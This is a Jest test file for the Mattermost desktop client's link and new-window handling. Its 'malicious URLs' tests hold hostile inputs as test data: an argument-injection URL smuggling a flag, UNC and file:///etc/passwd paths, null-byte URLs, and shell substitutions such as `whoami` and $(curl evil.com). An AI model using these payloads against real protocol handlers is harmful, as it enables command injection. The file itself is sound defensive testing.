// Copyright (c) 2016-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

'use strict';

import {dialog, shell, BrowserWindow} from 'electron';

import NavigationManager from 'app/navigationManager';
import WebContentsManager from 'app/views/webContentsManager';
import {getLevel} from 'common/log';
import ContextMenu from 'main/contextMenu';

import PluginsPopUpsManager from './pluginsPopUps';
import {WebContentsEventManager} from './webContentEvents';
import {generateHandleConsoleMessage} from './webContentEventsCommon';

import allowProtocolDialog from '../../main/security/allowProtocolDialog';

jest.mock('electron', () => ({
    app: {},
    dialog: {
        showErrorBox: jest.fn(),
    },
    shell: {
        openExternal: jest.fn(),
    },
    BrowserWindow: jest.fn(),
    session: {},
}));
jest.mock('main/contextMenu', () => jest.fn());
jest.mock('app/mainWindow/mainWindow', () => ({
    get: jest.fn(),
}));
jest.mock('main/security/allowProtocolDialog', () => ({}));
jest.mock('app/callsWidgetWindow', () => ({}));
jest.mock('common/views/viewManager', () => ({
    getViewByWebContentsId: jest.fn(),
    handleDeepLink: jest.fn(),
}));

jest.mock('app/views/pluginsPopUps', () => ({
    handleNewWindow: jest.fn(() => ({action: 'allow'})),
}));

jest.mock('main/utils', () => ({
    composeUserAgent: jest.fn(),
}));

jest.mock('common/config', () => ({
    spellcheck: true,
}));

jest.mock('main/app/utils', () => ({
    flushCookiesStore: jest.fn(),
}));

jest.mock('common/constants', () => ({
    MATTERMOST_PROTOCOL: 'mattermost',
}));

jest.mock('main/security/allowProtocolDialog', () => ({
    handleDialogEvent: jest.fn(),
}));

jest.mock('app/views/webContentsManager', () => ({
    getViewByWebContentsId: jest.fn(),
    getServerURLByViewId: jest.fn(),
}));

jest.mock('app/navigationManager', () => ({
    openLinkInNewTab: jest.fn(),
}));

jest.mock('main/i18nManager', () => ({
    localizeMessage: jest.fn(),
}));

describe('main/views/webContentsEvents', () => {
    const event = {preventDefault: jest.fn()};

    describe('willNavigate', () => {
        const webContentsEventManager = new WebContentsEventManager();
        webContentsEventManager.getServerURLFromWebContentsId = () => new URL('http://server-1.com');
        const willNavigate = webContentsEventManager.generateWillNavigate(1);
        const popupWindowSpy = jest.spyOn(webContentsEventManager, 'isTrustedPopupWindow');

        afterEach(() => {
            event.preventDefault.mockClear();
            popupWindowSpy.mockReset();
            webContentsEventManager.customLogins = {};
            webContentsEventManager.popupWindow = undefined;
        });

        it('should allow navigation when url isTeamURL', () => {
            willNavigate(event, 'http://server-1.com/subpath');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when url isAdminURL', () => {
            willNavigate(event, 'http://server-1.com/admin_console/subpath');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when isTrustedPopup', () => {
            popupWindowSpy.mockReturnValue(true);
            willNavigate(event, 'http://externalurl.com/popup/subpath');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when protocol is mailto', () => {
            willNavigate(event, 'mailto:test@mattermost.com');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when it isChannelExportUrl', () => {
            willNavigate(event, 'http://server-1.com/plugins/com.mattermost.plugin-channel-export/api/v1/export');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should prevent navigation for invalid URLs', () => {
            willNavigate(event, 'not-a-valid-url');
            expect(event.preventDefault).toBeCalled();
        });

        it('should not allow navigation under any other circumstances', () => {
            willNavigate(event, 'http://someotherurl.com');
            expect(event.preventDefault).toBeCalled();
        });
    });

    describe('newWindow', () => {
        const webContentsEventManager = new WebContentsEventManager();
        const newWindow = webContentsEventManager.generateNewWindowListener(1, true);

        const mockContextMenu = {
            reload: jest.fn(),
            dispose: jest.fn(),
        };

        beforeEach(() => {
            webContentsEventManager.getServerURLFromWebContentsId = jest.fn().mockImplementation(() => new URL('http://server-1.com'));

            BrowserWindow.mockImplementation(() => ({
                once: jest.fn(),
                show: jest.fn(),
                loadURL: jest.fn(),
                webContents: {
                    on: jest.fn(),
                    setWindowOpenHandler: jest.fn(),
                },
            }));
            ContextMenu.mockImplementation(() => mockContextMenu);
            mockContextMenu.dispose.mockClear();
        });

        afterEach(() => {
            webContentsEventManager.popupWindow = undefined;
            jest.clearAllMocks();
        });
        it('should deny and show dialog on bad URL', () => {
            expect(newWindow({url: 'a-bad<url'})).toStrictEqual({action: 'deny'});
            expect(dialog.showErrorBox).toHaveBeenCalled();
        });

        it('should open URLs with non-standard characters externally', () => {
            expect(newWindow({url: 'https://google.com/?^'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('https://google.com/?^');
        });

        it('should open MS Teams URLs with curly braces in query string', () => {
            const teamsUrl = 'https://teams.microsoft.com/l/message/19:meeting_abc@thread.v2/123?context={%22contextType%22:%22chat%22}';
            expect(newWindow({url: teamsUrl})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith(teamsUrl);
        });

        it('should allow dev tools to open', () => {
            expect(newWindow({url: 'devtools://aaaaaa.com'})).toStrictEqual({action: 'allow'});
        });

        it('should defer about:blank to PluginsPopUpsManager', () => {
            expect(newWindow({url: 'about:blank'})).toStrictEqual({action: 'allow'});
            expect(PluginsPopUpsManager.handleNewWindow).toHaveBeenCalledWith(1, {url: 'about:blank'});
        });

        it('should divert to allowProtocolDialog for custom protocols that are not mattermost or http', () => {
            expect(newWindow({url: 'spotify:album:2OZbaW9tgO62ndm375lFZr'})).toStrictEqual({action: 'deny'});
            expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL('spotify:album:2OZbaW9tgO62ndm375lFZr'));
        });

        describe('should block malicious URLs', () => {
            it('should sanitize argument injection before passing to protocol dialog', () => {
                const maliciousUrl = String.raw`customproto:///" --data-dir "\\deans-mbp\mattermost`;
                expect(newWindow({url: maliciousUrl})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL(maliciousUrl));
            });

            it('should reject UNC paths with no scheme and show dialog', () => {
                const uncPath = String.raw`\\server\share\file.exe`;
                expect(newWindow({url: uncPath})).toStrictEqual({action: 'deny'});
                expect(dialog.showErrorBox).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });

            it('should route file: protocol through confirmation dialog', () => {
                expect(newWindow({url: 'file:///etc/passwd'})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL('file:///etc/passwd'));
            });

            it('should reject URLs with literal null bytes and show dialog', () => {
                expect(newWindow({url: 'customproto:///path\x00malicious'})).toStrictEqual({action: 'deny'});
                expect(dialog.showErrorBox).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });

            it('should reject URLs with percent-encoded null bytes and show dialog', () => {
                expect(newWindow({url: 'customproto:///path%00malicious'})).toStrictEqual({action: 'deny'});
                expect(dialog.showErrorBox).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });

            it('should reject completely malformed URIs with no scheme and show dialog', () => {
                expect(newWindow({url: 'not-a-url-at-all'})).toStrictEqual({action: 'deny'});
                expect(dialog.showErrorBox).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });
        });

        describe('should sanitize shell-relevant characters via serialization', () => {
            it('should percent-encode backticks', () => {
                expect(newWindow({url: 'customproto:///path/`whoami`'})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL('customproto:///path/`whoami`'));
            });

            it('should encode spaces in $() shell expansion patterns', () => {
                expect(newWindow({url: 'customproto:///$(curl evil.com)'})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL('customproto:///$(curl evil.com)'));
            });

            it('should preserve double-encoded values without double-decoding', () => {
                expect(newWindow({url: 'customproto:///path%2520with%2520spaces'})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL('customproto:///path%2520with%2520spaces'));
            });
        });

        describe('should handle mixed-case schemes', () => {
            it('should lowercase the scheme for ONENOTE:', () => {
                expect(newWindow({url: 'ONENOTE:///path'})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL('ONENOTE:///path'));
            });

            it('should lowercase the scheme for mixed case OneNote:', () => {
                expect(newWindow({url: 'OneNote:///path'})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL('OneNote:///path'));
            });
        });

        describe('should handle legitimate custom protocol URLs from the original issue', () => {
            it('should allow OneNote URLs with curly braces', () => {
                const onenoteUrl = 'onenote:///D:/OneNote/Apps/Test.one#Page&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}';
                expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL(onenoteUrl));
            });

            it('should allow OneNote URLs with backslashes', () => {
                const onenoteUrl = String.raw`onenote:///D:\OneNote\Apps\Mattermost.one#Sch%C3%B6ne%20neue%20Seite&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}`;
                expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL(onenoteUrl));
            });

            it('should allow OneNote URLs with unicode and emoji', () => {
                const onenoteUrl = 'onenote:///C:/notebook/section.one#Schöne%20Seite%20🌞';
                expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL(onenoteUrl));
            });

            it('should allow SharePoint URLs', () => {
                const sharepointUrl = 'ms-word:ofe|u|https://company.sharepoint.com/sites/team/Documents/file.docx';
                expect(newWindow({url: sharepointUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(new URL(sharepointUrl));
            });
        });

        it('should open in the browser when there is no server matching', () => {
            WebContentsManager.getViewByWebContentsId.mockReturnValue(undefined);
            expect(newWindow({url: 'http://server-2.com/subpath'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('http://server-2.com/subpath');
        });

        it('should open public file links in browser', () => {
            expect(newWindow({url: 'http://server-1.com/api/v4/public/files/myfile.img'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('http://server-1.com/api/v4/public/files/myfile.img');
        });

        it('should open help links in the browser', () => {
            expect(newWindow({url: 'http://server-1.com/help/helplink'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('http://server-1.com/help/helplink');
        });

        it('should open team links in the app', () => {
            expect(newWindow({url: 'http://server-1.com/myteam/channels/mychannel'})).toStrictEqual({action: 'deny'});
            expect(NavigationManager.openLinkInNewTab).toBeCalledWith(new URL('http://server-1.com/myteam/channels/mychannel'));
        });

        it('should prevent admin links from opening in a new window', () => {
            expect(newWindow({url: 'http://server-1.com/admin_console/somepage'})).toStrictEqual({action: 'deny'});
        });

        it('should prevent from opening a new window if popup already exists', () => {
            webContentsEventManager.popupWindow = {win: {webContents: {getURL: () => 'http://server-1.com/myplugin/login'}}};
            expect(newWindow({url: 'http://server-1.com/myplugin/login'})).toStrictEqual({action: 'deny'});
        });

        it('should open popup window for plugins', () => {
            expect(newWindow({url: 'http://server-1.com/plugins/myplugin/login'})).toStrictEqual({action: 'deny'});
            expect(webContentsEventManager.popupWindow).toBeTruthy();
        });

        it('should open popup window for managed resources', () => {
            expect(newWindow({url: 'http://server-1.com/trusted/login'})).toStrictEqual({action: 'deny'});
            expect(webContentsEventManager.popupWindow).toBeTruthy();
        });

        it('should open external URIs in browser', () => {
            expect(newWindow({url: 'https://google.com'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('https://google.com/');
        });

        it('should dispose context menu when popup window closes', () => {
            let closedCallback;
            const mockPopup = {
                once: jest.fn((event, callback) => {
                    if (event === 'closed') {
                        closedCallback = callback;
                    }
                }),
                show: jest.fn(),
                loadURL: jest.fn(),
                webContents: {
                    on: jest.fn(),
                    setWindowOpenHandler: jest.fn(),
                },
            };
            BrowserWindow.mockImplementation(() => mockPopup);

            newWindow({url: 'http://server-1.com/plugins/myplugin/login'});

            expect(webContentsEventManager.popupWindow).toBeTruthy();
            expect(webContentsEventManager.popupWindow.contextMenu).toBe(mockContextMenu);
            expect(closedCallback).toBeDefined();

            closedCallback();
            expect(mockContextMenu.dispose).toHaveBeenCalled();
        });
    });

    describe('consoleMessage', () => {
        const webContentsEventManager = new WebContentsEventManager();
        const logObject = {
            error: jest.fn(),
            warn: jest.fn(),
            debug: jest.fn(),
            withPrefix: jest.fn().mockReturnThis(),
        };
        webContentsEventManager.log = jest.fn().mockReturnValue(logObject);
        const consoleMessage = generateHandleConsoleMessage(logObject);

        afterEach(() => {
            getLevel.mockReset();
        });

        it('should respect logging levels', () => {
            consoleMessage({level: 'info', message: 'test0', lineNumber: 0, sourceId: ''});
            expect(logObject.debug).toHaveBeenCalledWith('test0');

            consoleMessage({level: 'info', message: 'test1', lineNumber: 0, sourceId: ''});
            expect(logObject.debug).toHaveBeenCalledWith('test1');

            consoleMessage({level: 'warning', message: 'test2', lineNumber: 0, sourceId: ''});
            expect(logObject.warn).toHaveBeenCalledWith('test2');

            consoleMessage({level: 'error', message: 'test3', lineNumber: 0, sourceId: ''});
            expect(logObject.error).toHaveBeenCalledWith('test3');
        });

        it('should only add line numbers for debug and silly', () => {
            getLevel.mockReturnValue('debug');
            consoleMessage({level: 'info', message: 'test1', lineNumber: 42, sourceId: 'meaning_of_life.js'});
            expect(logObject.debug).toHaveBeenCalledWith('test1', '(meaning_of_life.js:42)');

            getLevel.mockReturnValue('warn');
            consoleMessage({level: 'info', message: 'test2', lineNumber: 42, sourceId: 'meaning_of_life.js'});
            expect(logObject.warn).not.toHaveBeenCalledWith('test2', '(meaning_of_life.js:42)');
        });
    });
});
